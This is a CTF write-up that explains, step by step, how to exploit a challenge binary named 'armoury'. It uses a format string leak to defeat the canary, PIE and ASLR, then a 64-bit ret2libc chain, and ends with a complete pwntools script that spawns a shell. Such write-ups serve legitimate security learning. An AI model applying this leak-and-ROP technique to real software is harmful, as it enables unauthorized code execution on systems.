This writeup is based on Naivenom's writeup from the CTF which can be found
[here](https://naivenom.tistory.com/19).

I did not solve this problem during the duration of the CTF but found it to be
a good opportunity to write a detailed explanation about how I solved it.

-----

## 0. Some pre-requisites:

- It's nice to have gdb-peda and pwntools.  
- Knowledge on buffer overflow and ret2libc.   
- Knowledge of 64-bit environments and its difference from 32-bit environments (optional)  
- "scanf will quite happily read null bytes. it only stops at white space - strcpy/strcat are the functions you should worry about null bytes" -brx (This means we don't have to worry about the canary having null bytes)

P.S: How to set ASLR on on gdb (turns off every instance):  
```  
set disable-randomization off  
```

-----

## 1. Examining the program

When we boot up the program, we can clearly see the program has a format
string bug:

```  
chanbin_lee123@linux:~$ ./armoury  
*******Rifle Database**************

Enter the name of Rifle to get info:  
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

----------------DATA-------------------

0x7fa5447c5683.0x7fa5447c6760.0x7fa544506970.0x7fa5449e7440.(nil).0x1.0x1dbcdbced.0x252e70252e702500.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xc8316ab63d007025.0x5622dbcdbca0:

Sorry... We dont have any information about
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

---------------------------------------

Enter the name of Rifle to get info:

^C  
```

As per the output text, we can see that there are some addresses leaking (we
will observe this later), and then further, the material in the stack. We can
observe that the stack information is leaked from the 9th argument (after 9
"%p"s).

Let's check the security on the program.

```  
chanbin_lee123@linux:~$ gdb -q armoury  
Reading symbols from armoury...(no debugging symbols found)...done.  
gdb-peda$ checksec

CANARY    : ENABLED  
FORTIFY   : disabled  
NX        : ENABLED  
PIE       : ENABLED  
RELRO     : FULL  
```

- **Canary (Stack Smashing Protector, Cookie):** A null-byte terminated string that is located before the saved stack frame pointer (RBP) and return address (RET). This is a value that the program compares to its original value (stack_chk_fail)  before it returns. If this value is overwritten because of a buffer overflow vulnerability, the program will realize that it will not be safe to continue and will terminate the program.

- **NX ( Non-executable):** - you will not be able to execute any kind of shellcode by placing them on the stack. (Stack is declared as non-executable.)

- **ELF:** Executables and Linkable Format (basically the program you're running right now.)

- **PIE:** Position Independent Executable - All the sections of the program are randomly loaded into memory. (This includes the .data and .code section of the program). But, since the PIE only changes the executable's base address, you will be able to see that if you execute the command "objdump -d [ELF executable]" the output will only give offsets. And these offsets stay the same every run! Only the base address of your program will change, meaning that as long as you have the offsets and a base address to add from, you'll be able to call what you want.

- **ASLR (non-PIE):** Changes the position of stack, heap, library (but the main executable will get loaded in the same address.) 

- **RELRO (RELocation Read-Only):** Basically a full RELRO means that you won't be able to do anything like a GOT overwrite because the GOT will be read-only. ELF binaries that are dynamically linked refer to the GOT and PLT; when you call a function, the function will refer to the PLT - the PLT includes dynamic jumps which point directly to GOT. The GOT loads addresses from the PLT (through a linker) when the function is first called. Read up more on: [RELRO](https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3)

-----

## 2. Gathering materials

What we need:  
- Leaked canary  
- Gadget (pop rdi; ret)  
- Three libc addresses:  
	- base of libc  
	- (offset to) system()  
	- (offset to) "/bin/sh"

### 2.1. Getting the Canary

So, we already know from the first format string bug, that we are able to
access information on the stack.  
I first put a breakpoint in main (using the `b *main` command) and ran the
program, giving "BBBB" as the input.  
At the breakpoint, we can investigate the value of `$rsp` to see what we have.

![1](https://t1.daumcdn.net/cfile/tistory/99E257355C935CD913)

As you may observe, we have BBBB (0x42424242) on the stack. We can also see
the canary (ending with a null byte), the saved RBP, and return address, all
highlighted above.

The canary is located right before the stack frame pointer. As we know that
the stack is leaked after 9 %ps, we can conclude that the canary is the 13th
argument, the sfp is 14th, and the return address is the 15th argument we can
receive from our format string.

### 2.2. Getting the ELF base address

![2](https://t1.daumcdn.net/cfile/tistory/99511F375C935DF92B)

When we observe the saved RBP (from the previous screenshot above), we can see
that if we null the last three bytes out, we will be able to get the base ELF
address.  
This will be useful to us when we obtain our gadget as offsets from the base
address.

### 2.3. Getting the LIBC base address

Breakpoint at giveInfo to set a stop, so that we can observe the registers and
addresses. (`b giveInfo`)  
Run the program. (`r`)

![3](https://t1.daumcdn.net/cfile/tistory/996659375C942E432F)

There we can see the address we get from executing `scanf("%3$p");` (third
argument of the output)

![4](https://t1.daumcdn.net/cfile/tistory/996771375C942E442F)

If we take a look at our third argument that gets leaked, we can use that
leaked address to get the offset to our libc as shown above. We need to grab a
few more values too.

```  
gdb-peda$ p 0x7ffff7b15970-0x00007ffff7a3a000  
$1 = 0xdb970

gdb-peda$ p system  
$2 = {<text variable, no debug info>} 0x7ffff7a79480 <__libc_system>

gdb-peda$ p 0x7ffff7a79480 -0x00007ffff7a3a000  
$3 = 0x3f480  
```

We see that:  
- `%3$p`: Address of `<__write_nocancel+7>`  
- Offset to libc: `0xdb970`  
- Offset from libc to system: `0x3f480`  
- Hence: `%3$p` - offset to libc + offset from libc to system = address of system (in libc)

### 2.4. Address of "/bin/sh"

```  
gdb-peda$  find "/bin/sh"  
Searching for '/bin/sh' in: None ranges  
Found 1 results, display max 1 items:  
libc : 0x7ffff7b9bc19 --> 0x68732f6e69622f ('/bin/sh')

gdb-peda$ p 0x7ffff7b9bc19 -0x00007ffff7a3a000  
$4 = 0x161c19  
```

### 2.5. ROP Gadgets (pop rdi; ret)

```  
chanbin_lee123@instance-2:~$ ROPgadget --binary armoury  
Gadgets information  
============================================================  
0x0000000000000d03 : pop rdi ; ret  
```

-----

## 3. POC  
```  
BUFFER [24]  
CANARY [8]  
DUMMY [8]  
POP RDI; RET [8]  
ADDRESS OF "/BIN/SH" [8]  
ADDRESS OF SYSTEM() [8]  
```  
(Basic ret2libc structure in a 64-bit environment)

-----

## 4. Exploit Rundown

Full exploit can be found in the next section.

I'll try my best to explain everything.. So please ask if you don't understand
something written here.

```  
payload = ""  
  
r.recvuntil("Enter the name of Rifle to get info:\n")  
r.send("%3$p.%13$p.%14$p\n") # libc address, canary, saved rbp  
```  
↑ We want the 3rd, 13th and 14th arguments so we leak those.

```  
leak = r.recvuntil(":").replace(":", "").split(".")  
leaked_libc = int(leak[0], 16)  
  
offset_to_libc = 0xdb970  
offset_to_system = 0x3f480  
offset_to_binsh = 0x161c19  
```  
↑ Once we receive the leaks, we split the string regarding '.'

- leak[0] = 3rd argument  
- leak[1] = canary  
- leak[2] = sfp

I also save the offsets I have.

```  
libc_addr = leaked_libc - offset_to_libc  
system_addr = libc_addr + offset_to_system  
binsh_addr = libc_addr + offset_to_binsh  
```  
↑ Calculate all the addresses I need using the offsets. If any of these
calculations don't make sense, refer back to section 2.3 - I've explained a
little bit there.

```  
canary = int(leak[1], 16)  
leaked_elf = int(leak[2], 16)  
elf_addr = leaked_elf - (leaked_elf & 0xfff)

offset_pop_rdi = 0xd03  
pop_rdi = elf_addr + offset_pop_rdi  
```  
↑ I also cast the canary to int here, and calculate the ELF base address.

If you do a &0xfff operation, you get the last three bytes of a number - so we
can just subtract this from the original address and we get the base address.

```  
payload += "A"*24 # Fill up the buffer  
payload += p64(canary) # Canary  
payload += "B"*8 # Overwrite saved RBP  
payload += p64(pop_rdi)  
payload += p64(binsh_addr)  
payload += p64(system_addr)  
payload += "\n"  
```

As written above (POC) this is the generic ret2libc payload.

Since the argument to system() is passed on through RDI, we load the address
of /bin/sh on RDI (using pop rdi) and call system().

-----

## 5. Full Exploit  
```  
from pwn import *  
  
r = process("./armoury")  
  
payload = ""  
  
r.recvuntil("Enter the name of Rifle to get info:\n")  
r.send("%3$p.%13$p.%14$p\n") # libc address, canary, saved rbp  
  
r.recvuntil("----------------DATA-------------------\n")  
  
leak = r.recvuntil(":").replace(":", "").split(".")  
leaked_libc = int(leak[0], 16)  
  
offset_to_libc = 0xdb970  
offset_to_system = 0x3f480  
offset_to_binsh = 0x161c19  
  
libc_addr = leaked_libc - offset_to_libc  
system_addr = libc_addr + offset_to_system  
binsh_addr = libc_addr + offset_to_binsh  
  
print "libc address: " + hex(libc_addr)  
print "system address: " + hex(system_addr)  
print "binsh address: " + hex(binsh_addr)  
  
canary = int(leak[1], 16)  
leaked_elf = int(leak[2], 16)  
elf_addr = leaked_elf - (leaked_elf & 0xfff)  
  
print "canary: " + hex(canary)  
print "elf address: " + hex(elf_addr)  
  
offset_pop_rdi = 0xd03  
pop_rdi = elf_addr + offset_pop_rdi  
  
payload += "A"*24 # Fill up the buffer  
payload += p64(canary) # Canary  
payload += "B"*8 # Overwrite saved RBP  
payload += p64(pop_rdi)  
payload += p64(binsh_addr)  
payload += p64(system_addr)  
payload += "\n"  
  
r.recvuntil("Enter the name of Rifle to get info:\n")  
r.send("AAAA\n")  
  
r.recvuntil("Would you like to give us some feedback:\n")  
r.send(payload)  
  
r.interactive()  
```

Original writeup (https://evertokki.tistory.com/261).